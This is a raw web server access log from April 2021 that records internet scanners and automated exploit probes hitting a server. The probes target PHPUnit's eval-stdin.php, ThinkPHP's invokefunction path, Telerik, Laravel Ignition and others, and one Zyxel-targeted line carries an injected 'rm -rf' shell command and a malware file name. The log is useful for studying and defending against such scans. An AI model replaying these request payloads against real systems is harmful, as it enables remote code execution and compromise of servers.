45.146.165.165 - - [01/Apr/2021:13:27:22 +0200] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:22 +0200] "GET /console/ HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:22 +0200] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:23 +0200] "POST /api/jsonws/invoke HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:23 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [01/Apr/2021:13:27:22 +0200] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.142.125.56 - - [01/Apr/2021:13:46:37 +0200] "GET / HTTP/1.1" 200 253 "-" "-"
162.142.125.56 - - [01/Apr/2021:13:46:38 +0200] "GET / HTTP/1.1" 200 271 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.212.231.224 - - [01/Apr/2021:14:18:57 +0200] "GET / HTTP/1.1" 200 253 "-" "curl/7.58.0"
40.88.4.239 - - [01/Apr/2021:14:22:56 +0200] "Akitaskid.arm7;rm+-rf+Akitaskid.arm7 Zyxel.arm7%3b%23&remoteSubmit=Save" 400 0 "-" "-"
40.88.4.239 - - [01/Apr/2021:14:22:56 +0200] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 0 "-" "MtmKilledYou"
35.240.117.172 - - [01/Apr/2021:14:28:05 +0200] "GET / HTTP/1.1" 200 329 "-" "python-requests/2.25.1"
88.5.237.10 - - [01/Apr/2021:15:56:10 +0200] "GET / HTTP/1.1" 200 276 "-" "Mozilla/5.0 zgrab/0.x"
186.33.114.41 - - [01/Apr/2021:16:05:25 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
128.14.211.190 - - [01/Apr/2021:16:13:11 +0200] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
207.154.221.26 - - [01/Apr/2021:16:32:02 +0200] "GET / HTTP/1.0" 200 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
207.154.221.26 - - [01/Apr/2021:16:39:12 +0200] "GET /_ignition/execute-solution HTTP/1.1" 404 497 "-" "python-requests/2.18.4"
